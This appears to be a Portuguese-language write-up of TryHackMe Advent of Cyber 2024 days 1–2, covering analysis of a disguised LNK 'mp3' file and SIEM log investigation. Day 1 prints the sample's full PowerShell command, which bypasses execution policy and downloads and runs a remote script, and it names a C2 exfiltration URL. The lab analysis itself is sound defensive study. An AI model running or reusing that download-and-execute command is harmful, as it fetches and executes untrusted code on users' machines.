# Advent-of-Cyber-2024-THM
![image](https://github.com/user-attachments/assets/04709f1d-900f-4a3e-9952-d24ccf24caf3)
<img src="https://tryhackme-badges.s3.amazonaws.com/VivianeFerro.png" alt="Your Image Badge" />
## Tarefa 7 : Segurança operacional

### Dia 1: Talvez a música do SOC-mas, ele pensou, não venha de uma loja?

### PASSO A PASSO PARA A RESOLUÇÃO DAS QUESTÕES:

1. Executei o `Nmap` para escanear as portas que estavam abertas, o resultado mostrou 3 portas:
`Porta 22 (SSH)
Porta 80 (HTTP)
Porta 8000 (HTTP-alt)`



![image](https://github.com/user-attachments/assets/c7d43844-fdc9-454a-b562-953a2924df0f)


2. Em seguida enumerei os diretórios do webserver com o `Gobuster`, o que me mostrou o diretório /download estando disponivel



![image](https://github.com/user-attachments/assets/947a076f-b968-4f0e-a30b-a28302a3e680)



3. Acesse o diretório como `http://IP_DA_MAQUINA/download`, assim ele já faz download do arquivo zip denominado `download.zip`.


![image](https://github.com/user-attachments/assets/994d2165-81f4-4ee3-825c-79bc170fdae2)


4. Descompacte o arquivo zip, e lá conterá dois arquivos .mp3, sendo eles **song.mp3** e** somg.mp3**

Utilizando o comando file song.mp3 eu identifiquei o arquivo como sendo um áudio em formato MPEG ADTS se trata realmente de um arquivo de musica, não tem nada de suspeito nele.
![image](https://github.com/user-attachments/assets/1d3396c9-3635-49b9-bcf2-8a1d47a8f7f8)


Mas temos um arquivo disfarçado sendo o segundo arquivo chamado de somg.mp3, a primeira vista também pode parecer suspeito por ter um erro de ortografia. Mas iremos analisar a fundo esse arquivo.
Utilizei o comando file somg.mp3 identifiquei como um atalho LNK ao inves de um arquivo de audio, que apontava para o `powershell.exe`. iremos nos apronfundar muito mais.
![image](https://github.com/user-attachments/assets/4b9fb32d-e983-4834-9a9b-7282d912d88b)


5. Usei `exiftool somg.mp3`, para obter informações mais detalhadas sobre o atalho, e o arquivo apontava para um comando PowerShell, que baixava e executava um script localizado no GitHub, sendo o comando:
`powershell.exe -ep bypass -nop -c (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1')
`

![image](https://github.com/user-attachments/assets/fdf7380b-cde3-42af-8c72-8a3699b23b60)


---------------------------------------------------------------------------------------------


![image](https://github.com/user-attachments/assets/45ce33f5-bab7-4c73-b64f-6bede4101ee0)
* Eu também usei o `exiftool no arquivo song.mp3`, confirmando que ele era realmente um arquivo MP3 e obtendo a informação da 1ª pergunta da TAREFA 7, sendo o Artista: **Tyler Ramsbey**

![image](https://github.com/user-attachments/assets/9eb60ee0-4281-454e-90bd-57aed094c6fa)


-------------------------------------------------------------------------------------------------------------


![image](https://github.com/user-attachments/assets/84059020-f16f-4cc7-9b70-8812c1ed0da0)
* Execute o comando` exiftool somg.mp3`, copie o link, e cole no navegador, e analise o conteúdo, e que responde nossa pergunta está na função Send-InfoToC2Server que envia as informações roubadas para um servidor C2 (Command and Control) usando um comando Invoke-WebRequest. O servidor C2 especificado está localizado na URL `http://papash3ll.thm/data`.
![image](https://github.com/user-attachments/assets/e8316db0-ac58-46a6-a9ad-d1b66e6df77c)
![image](https://github.com/user-attachments/assets/29092bbb-e21b-436d-a9fe-cb63d0b974d1)


-------------------------------------------------------------------------------------------------


![image](https://github.com/user-attachments/assets/835e0920-5b9c-4cdd-8428-0b45d7d59e8b)
* Fácil, Fácil. 
https://github.com/MM-WarevilleTHM/M.M



------------------------------------------------------------------------------------------------




![image](https://github.com/user-attachments/assets/801d6509-2a73-4f99-be85-e1e059fe6fd4)
https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/commit/e2a7aea21f07f52ebdc7d9c1edfa7ac546f7406d
![image](https://github.com/user-attachments/assets/e1337464-cacd-4403-8ac9-a0f31e70b02f)











## Tarefa 8

## Análise de log



### Dia 2: O falso positivo de um homem é a miscelânea de outro.


### PASSO A PASSO PARA A RESOLUÇÃO DAS QUESTÕES:
![image](https://github.com/user-attachments/assets/a4b96c0f-8394-4af4-95ff-b314913112e0)

* Para determinar quantas tentativas de logon com falha ocorreram, eu acessei o Elastic SIEM e utilizei filtros específicos para refinar a minha busca e obter um resultado preciso.
Primeiro, apliquei um filtro na categoria do evento. 
* Defini o filtro `event.category` como `authentication` para selecionar apenas os eventos relacionados a autenticação de usuários, depois, acrescentei o filtro `event.outcome` como `failure`. Dessa forma, eu estava focando apenas nas tentativas de logon que falharam, ou seja, aquelas que não foram bem-sucedidas.
* Para garantir que todos os eventos relevantes fossem incluídos, configurei o intervalo de tempo para abranger de 29 de novembro de 2024 até 1º de dezembro de 2024. Assim, tive certeza de cobrir todos os eventos relacionados ao alerta de segurança que estava sendo analisado.
* Depois de aplicar esses filtros, o resultado exibido foi de 6.791 hits, ou seja, 6.791 tentativas de logon com falha. Esse valor aparece no topo dos resultados, conforme destacado na interface na evidência abaixo.
![image](https://github.com/user-attachments/assets/d0cc8e7e-3445-4c3d-91a0-773a8f7a7324)


---------------------------------------------------------------------------------------------------------------------------
![image](https://github.com/user-attachments/assets/c61b944a-6ec1-4f8d-9553-120696c2c539)
* Inicialmente, apliquei os filtros `event.category:authentication` para ver somente os eventos relacionados a autenticações, `source.ip` para verificar de onde vinham as conexões que falharam, observando especialmente a origem dos acessos.
* Ajustei o intervalo de tempo para abranger o período de 29 de novembro de 2024 até 1º de dezembro de 2024. Isso me permitiu capturar todos os eventos relevantes para o caso.
* Verificando os resultados, encontrei que um dos IPs associados a um usuário (service_admin) estava se conectando de forma suspeita. Este IP foi identificado na coluna source.ip como `10.0.255.1`.
![image](https://github.com/user-attachments/assets/78b36caf-b782-421e-97ba-b25cc348fb47)
  
---------------------------------------------------------------------------------------------------------------------------

![image](https://github.com/user-attachments/assets/9f5a9ffe-d3f2-4dbf-b52d-10bfa0d013e4)
* Apliquei o filtro `event.category: authentication` para visualizar apenas os eventos de autenticação, e também filtrei por `host.name: ADM-01.wareville.thm` para focar nos eventos que ocorreram especificamente no servidor ADM-01, adicionei o filtro `user.name: service_admin` para selecionar apenas as atividades do usuário que estava realizando a autenticação, por fim, apliquei o filtro `event.outcome: success` para garantir que eu estivesse vendo apenas as tentativas de autenticação que tiveram êxito.
* Após aplicar todos os filtros, encontrei o evento de logon bem-sucedido. No campo Time, estava registrado o momento exato em que o logon foi realizado: Dec 1, 2024 08:54:39.000, esse evento indicava que o Glitch conseguiu fazer logon com sucesso no servidor ADM-01 naquela data e horário.
  ![image](https://github.com/user-attachments/assets/30b6b344-2c5f-47ee-8267-a065ac23f4e0)

--------------------------------------------------------------------------------------------------------------------------
![image](https://github.com/user-attachments/assets/de473c0c-a006-4b55-95d4-da3b4e66495c)

* Iniciei aplicando o filtro `event.category: process` para selecionar apenas os eventos relacionados à execução de processos. Também utilizei outros filtros relevantes, como `host.name` e` user.name`, para garantir que estava analisando apenas os eventos do usuário `service_admin` em máquinas específicas. Adicionei a coluna `process.command_line` para verificar o comando exato que foi executado.

* Encontrei o comando PowerShell executado no servidor. O comando estava codificado em Base64. O comando encontrado foi em base64 foi SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==.
* Copiei o codigo base64 para decodificar o comando no CyberChef, apliquei as operações **From Base64:** Para converter o comando da base codificada. **Decode Text:** Usei a codificação UTF-16LE (1200), pois essa é a usada pelo PowerShell ao codificar um comando com -EncodedCommand.
* O comando decodificado foi `Install-WindowsUpdate -AcceptAll -AutoReboot`.
![image](https://github.com/user-attachments/assets/733f95a3-0cb9-4cdc-aa1a-afcd0cb62c39)


-------------------------------------------------------------------------------------------------------------------------
